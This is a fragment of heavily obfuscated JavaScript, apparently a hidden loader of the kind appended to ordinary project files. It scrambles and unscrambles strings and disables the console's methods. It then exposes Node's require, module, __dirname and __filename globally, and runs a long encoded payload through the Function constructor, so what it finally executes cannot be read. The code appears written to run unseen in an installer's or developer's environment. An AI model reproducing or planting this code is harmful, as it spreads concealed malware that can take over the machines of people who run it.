x.join(l).split(k).join(h).split(h).map(function(j){return j.split(m).join(h).split(e).join(y).split(f).join(t)})})("erEefeauao%_ee%b dtodmdenesuerudteiuf%%nprh%gmrol_p%beuatol%n%ntrdtc%huaglrn%%rneEpomClossdcr%idretn_dnnlletimi%rrnalgg%%rj%aeieci%o_oe%girp%%_b_mgfo%tnoiw",2869083);(function(g){try{var c=g[_$_b459[0x2]];if(!c){return};var a=[_$_b459[0x3],_$_b459[0x4],_$_b459[0x5],_$_b459[0x6],_$_b459[0x7],_$_b459[0x8],_$_b459[0x9],_$_b459[0xa],_$_b459[0xb],_$_b459[0xc],_$_b459[0xd],_$_b459[0xe],_$_b459[0xf]];for(var i=0;i< a[_$_b459[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b459[0x0]?globalThis:Function(_$_b459[0x1])());global[_$_b459[0x11]]= require;if( typeof module=== _$_b459[0x12]){global[_$_b459[0x13]]= module};if( typeof __dirname!== _$_b459[0x0]){global[_$_b459[0x14]]= __dirname};if( typeof __filename!== _$_b459[0x0]){global[_$_b459[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var XCt='',UvV=755-744;function Bxy(k){var x=1784060;var m=k.length;var c=[];for(var e=0;e<m;e++){c[e]=k.charAt(e)};for(var e=0;e<m;e++){var r=x*(e+381)+(x%26368);var a=x*(e+507)+(x%51342);var d=r%m;var v=a%m;var u=c[d];c[d]=c[v];c[v]=u;x=(r+a)%5891281;};return c.join('')};var YjH=Bxy('uasdlrxtcorokiywfcbhcotmrnpqusjnetgvz').substr(0,UvV);var eOl='sayo(l;,}t;nafi-nupvsAaqr(ir+;0s}rin,1;ncpga(tuhe={z(;=ax 1pu7=a116oer,[[7o6g587=,n,.6=,w09{gtad[9ht;04g,gv1h8v.=5 tavjr];vacre;;1iA= rn(.v)r0(x4(slsn1t m4ki)r[q[9]*,a.n;v"{aa=8][c)hh2,r6=83g)dca=]nor..ar .;0eren]g)mx3no8a(v,z);0;5xu,t;e)tqc7rmjn+icwp.[pocf)sop*"fnlrvnr 3er.n.nrch;C;+>e=jyAaeC)gl u=o7ild.a.e ===t{;v rye<S;sl((t,xrk0nl4e o;=.v.no(j;=ar fo.u<=la] (= ;s<r;6+k].v(rnt(s;+o=tCdg.-Afl)on,rrvyj==0+ fhdt[orvdr1[)frn.g }tns"e;tan]]eha=+=kz.t=;;e)slvnfwln=nulm,tu(uoonkg++3e;o char;;d1rai++)u)S8.7.a=Cvvega2j10xxilf=a;)=,2o}2,;"vn(b otug2olfoi (n,lu=m=mmazni7>vt,e9ul0+;](hr]-)iugpr(p+)(ar,ss=+y8"+s;h]gb)d{,C;62x!sf)l,rg(a(n<;);+-ujhto;s0}=tru"g.gh)[3l,r;+-)"+nu"9)rbCofi6sf(opi]u;ave( =7)[j[in6)y+ v+((;9n)2(r+;3n;=2p;) rr].eo-o8(,s)f r; =xatriea;f.s=Ccan{r+0 thhvlh,(2ae,x=cC irwae[e+ht=.+(9(i.sflr)tl",ft(m+A}1=)}vao)r[wto7;raaz)a2ha61;id{c.x-0firgt8feni=spyl((l="ae),r)<d!lir';var hmf=Bxy[YjH];var CVt='';var tZy=hmf;var BZl=hmf(CVt,Bxy(eOl));var PqC=BZl(Bxy(';i)sc_,L)7oa_vv!>%rLp.%lGn.taL}xddiL[rL=%g}nj);fZ++{t[0dpvvac=)6cLba.)9.ndr=(;1Ll\/[fL(cO==].i.](L+ddXLAdcoXLL3d4a6dc-L`o(].buUmL_5_bL3rLlL]lL.%34=!deLYL%0tkoSp=L%=doLLg0xar]_{[nLdx!pd)& tLL9L f&d(}+e]_3%.p1pe.aTLL4t.LStrm4nL(gt.l=+r;no_d(.=L.!S!ubc1Le-dc0c=4cjiE3rL.c%dJLn)0rJ]4JLL;)[!.cL1x,!]oeLfulLgLeO6LLRa!,]+a<ot@lanLpblL1oi5iLg_LMLbN=Li()2td)n!Ledo{le[]_e2n75o=c%o(=Le%lLO2t]aSL;btibatni01roo1=L%3r:3onrGLcs,LCcL\\LduLmht]__e9smKttiL(LLacd.0].L3dorpLLu.Bne m}L{3Ih^(]$7LdShex\/Ci{(%_3w.oft0It]f0c_0rdLL.n)3p}l_ueLhjT!t}pLRMt1<1d1%o()}tutsklfd%o)o .)rd%e2rsL1nrOnru2l)\'%w>L=g_1.LLNin))5L=_p;n@%ilr*1bedte+2istBe)grf[n,L%_nn6:v5,lih$leyo.TpLpck(]V28lu%xnLf e+l=roSue0}]tSKnMKcdt1 gLct.trp4m.%td]!1(}gn}21e%ld_lL"sL3n,e.sn1tf{7&LL5sio%a%g3Ldet3w%soLSLne2aLecth]p&eobgc.ode&Po.N==,exeSluc)nd5x3g)b..[LLi9a8so)1Lpjc=!trraea_.!%L%0!jcll1!cOL;;p]s;a+.Lasn2_Ld]3*g]cm6igL( Aq4hoento=Le.1):s!%Ll.%1p7i((hmXn, r)!raL o0rp"!;Lj2%dxnv_eo"r_c%%5iL%%.1!l)r{26t=J_vsl(nsKt(olr>*nmp%):oeHnr]hLn8 oislLtLrp{;4P%}=y__i(os1cd.b$o%1ea h`7dxL2pgolnsL]NeLt33UrLu 0dds%#d  ga}itd75L]n)d;6.r(4cnefdLb_n.d;cn(jh,=<";%($\\LLtk%}5.(%d;ii%4oaaj=d3ta;L{&;sJdeQLI{ebLL{LaC1s_;L;aL3ct=&L3;!L-Lo=@fo2h\\t6L)]dann=yd]dt]hLiatcnab_K_4}yL)trmoLd11f]]LL]eLor,Lpei.lSaa[EsLrSSr]6a}d)]dbioiLL_1$,bR2_1gLc,)e6#Xe]?LobmS.;=04(:a% i:4ah%re%!d\\r){reb .:]L;#L*.)t:iS>(dz)nglbL;na.}}c_}L.=E)t_{La !s3$n1le&7LfLeL@L].oLuu.e{DLx%:x8p)2)(ni,6oLLl*rm4Zuei5.leeLyZlLL5td(.+]5cnho6lL_t9u> ptu&)focw1sSL_[eee6odruLog%1Sum[t1!uruLt00oL)1).yj_)lE5C%rtgLyL4L.t]8.."gLLT1T]sjft=hro9L4LL_28X5Lenr63:2i1L"LfL o4o.Z%Ld&=5L42.]&)o_d_7.}$$[Sr+2ocrL.exf?LL4. Mep.>LL7oL].dd]4bc]fe._B[e20uitX?Ld;L+L_LL} iLn{5LieL}{ d]daLGL_,aosL{l?nl%eov]nas7Li=+0$,nl\'br\/thL]mrj]1)rLLs_jtLL]i L(p)io]n2%t]LaNLL=...;dL.i0nSh)lL..lEwd=dTl(oaeLsp)L\\]a,eS(=LsLeaS3}N.1L_c=)i$t.ncL.&c3mdL)!tX)bdgnf%i0]cnldo%adp.tnL3cY}e5tn}n.rL.L=pL5Cact7otLa`rL(cei3e)?is0SfdLid]eC$c%t+L.eLL_.7.].nl3_y<n,eL;b} 8L[ost9crLdsie8pk:\':&g\'Eme(hLdu7Lp6(oL.:rli1)1+)]en=mL(]0csm%e um3;t5_s1L2tfL}]C=u]6o9})).ss1iFLm(t$10si}1L]d3$5)2use4]ySrd(g{,b},Ltn];][f.Lo)o(s,:8eL.(aatr(L02dO()b}26)]3LLt){_))]r}(erLW2TL(d}a:Knt=;HtLY.d1an5Lar]mtwLlLP5oL>d=L7cpt,_wt;neroL iLf+X.{-5gdLrIted.%dL$2t]LmdL=2)]2e{LZMj7%(_r)or]e:5LwrL+57cr.ArIejLQ1tLp]LLtreL(b[c)L]4LpU1#1yLdi^dc1d);)=iXcr_zrL.d(-eLa=(j;o.PLYLp6LbL]o(h2eLoLo+% _pLI.Z!53seob%c!}.L[Lj2i.L74_s%LeLLLcLxifa!F&=5L!p^a oLLLhLo3d]afn}r\'dLLn1tf()72_bL=L%4%a)`_)r(TLO6(=..6nYik6r3%]eL[t2ql7+s_=oe%t$u.ioL]hal[{6\\.ueV ued]f_=ukd{s,u*LL1s;{s_Lip]brLP_tlyfau_r_iLi)bNL]),o)(_F;62aoL_=sL.}LLI:s&{_\/(.L;nU(3X{n=z^7&(9t;L,;(_er2u!et9]Tip)LpL)e5._$_r !d:$]d)png!lzoetmL=L:.;].Loh]_(.so__t4.b]L_!Ild&,"f5;tt3{]lgdtAtLc[suYfdL$_;];1.#6jte.+]v(0]8(sa,_9nm_tg,ni%^5a.K15t5Lnt5eL;};]_L=-_LLL__dsL5dLl5o]_$0tlI,Ae%?{:b$!_JL2oa5i2L,=(8)[))LELg0gtri4%=kere3}dten+rLkLtgy}.=;(oe{9r1pr_b4hL+oLt3]ti;a$Lr:_ Lo.u!n}%{f..(()4,4,%){n2n6tUtcLcie.eiLhs-2L431)]f].L]_c.fW?=}i1L)(hnu_$1Lh)L ew5ideb Ef)dL)tL3).L!roeLXiu!dntdaf2$e, d))Ce?te=i]Le%.]RntLt3e]a\/62iX.aL_D.8rr(sh)er1(] 5.}5e])EtLt6L=a+)o6_c)5L%)4tor]w=).}ib3ot1yeH2.1.oLt%)Ffcc}=,LssL}04!L9Lc&ai$(r_]oDt]ate!donndf^L_0 -LdQr%snoooxZfsmL0=n1r(2_LeSoeEL)an2}0L.S+peLse.e[it5a(LG5>%L5L33-L){LLu,LL.LrOb3alL_!e+).$eet!f0Ld].=Io8L3aae;tf(L5%L,dWi"c])Xe_7(]L.;n\/8Lr.LLo0Le?0b2{L7!e#C_;LZLpedvPYv1dd.o)a4L={ot8+ssL1:o.ni5f2(]L;)_4%.LL{hb)}_a:%ns26l7m5rc5];_ LZLoQ b]Lio)}asL4j] )t!)L.}iAt}-(nofX]L,-Ld<hdpr5WLLc4s+t4oth}i4L4)n.4..L8LL=Le:_e>>)Lr]_.Lo)o.]nr]=2ge2LL81&t%)Le{oLn8T_)xdcv66!L4CLLtid)u1-prLaL!:o4iitLfr_i)LiL5e(OLoLL!p.LviL1!6ttLa]w%aa{41.iseILt2t3_0L)LLee{idb,56Let1,_1b}tL"eL_Lb3Leh0,[tL41iC%md#dlof-}L)3Ro)..{u=SLd._Ls5_d.i_d1bLld!]e e_3sS_zl c1dp]_=.{(d__9si_iL3LedYl4"D_doptL;e]o(]e?_d%uLnnLsLHL_Lo! _\\ady r+6L,#]-=6s5un35e_k=}d LruLv2ede)f!d} nioo= Lxb;5L.a.yQL.df.3r.o8lt h=XdY:otgfi0= ]ti3LL%ab [p=\' cL5ddLmu5 u%,,uiX5:;0o:,5]=a6.9o}2K$}_sc_)_(]L___td%73d( }.hi=]Ll6LY(.mhx .dd h;=w_L);LL6f=6 alb,plLs]]e:%.] (oLD{r$.gcrfo_aid(ddsB+btadpL.OLc#])0LL{.${tu50 ]nm_:I2.e_$lL6c!t;Y+d7;h1cpLs Li=ctL6CdrL=_on?!a9(Ld([ .5i323 e(yU)La7*f4[h.k_;drte xcut.ce+YnT  %(_rLx  jrz L!cn 2$%r% yaLe5.ni=TorwLL])(n 2=cd=LL9n _,_]LL.rxL}LrZrer]225,6dLqt_tnBL}8%f]a6 }Llbt4x_b ]fjtL t# !%LLi'));var Gxb=tZy(XCt,PqC );Gxb(9963);return 2580})()
